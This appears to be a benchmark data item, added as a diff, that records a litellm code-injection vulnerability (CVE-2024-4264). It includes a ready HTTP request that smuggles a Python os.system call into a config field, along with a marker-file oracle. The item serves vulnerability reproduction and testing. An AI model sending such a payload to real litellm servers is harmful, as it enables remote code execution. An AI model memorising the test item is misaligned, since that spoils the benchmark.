@@ -1,0 +1,15 @@
+{
+  "file_id": "70_litellm_huntr_a3221b0c-6e25-4295-ab0f-042997e8fc61",
+  "numeric_id": "70",
+  "library_hint": "litellm",
+  "source": "huntr",
+  "title": "Remote Code Execution due to unsafe use of eval in litellm.get_secret() when processing Google KMS encrypted secrets",
+  "cve": "CVE-2024-4264",
+  "cwe": "CWE-94: Code Injection",
+  "library": "litellm",
+  "affected_version": "< 1.44.16",
+  "vulnerable_function": "litellm.get_secret",
+  "triggerability": "indirect",
+  "trigger_payload": "POST /config/update HTTP/1.1\\nHost: {BASE_URL}\\nAccept: application/json\\nAuthorization: Bearer sk-1234\\nContent-Type: application/json\\nContent-Length: 126\\n{ \"environment_variables\": {\"REDIS_HOST\":\"__import__('os').system('touch /tmp/pwned.txt')\"}}",
+  "oracle": "File created at /tmp/pwned.txt"
+}
